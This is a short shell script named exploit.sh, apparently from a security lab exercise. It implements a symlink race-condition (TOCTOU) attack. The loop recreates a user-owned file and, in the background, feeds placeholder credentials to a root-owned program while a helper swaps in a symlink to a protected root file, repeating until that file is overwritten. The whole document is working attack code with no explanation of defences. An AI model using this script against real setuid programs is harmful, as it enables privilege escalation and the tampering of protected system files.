#!/bin/sh
# exploit.sh

# Note the backtick ` means assigning a command to a variable
OLDFILE=`ls -l Root/rootfile.txt`
NEWFILE=`ls -l Root/rootfile.txt`

# Continue until THE ROOT_FILE.txt is changed
while [ "$OLDFILE" = "$NEWFILE" ]
do
    rm -f userfile.txt
    echo "This is a file that the user can overwrite" > userfile.txt

    # The following is done simultaneously
    # If a command is terminated by the control operator &, the shell executes the command in the background in a subshell. The shell does not wait for the command to finish, and the return status is 0. Commands separated by a ; are executed sequentially; the shell waits for each command to terminate in turn. The return status is the exit status of the last command executed.

    # echo “username1 fake_password” | Root/rootprog userfile.txt & User/symlink userfile.txt Root/rootfile.txt & NEWFILE=`ls -l Root/rootfile.txt`
    echo “username1 fake_password” | Root/rootprog_nosuid userfile.txt & User/symlink userfile.txt Root/rootfile.txt & NEWFILE=`ls -l Root/rootfile.txt` 

done

echo "SUCCESS! The root file has been changed"
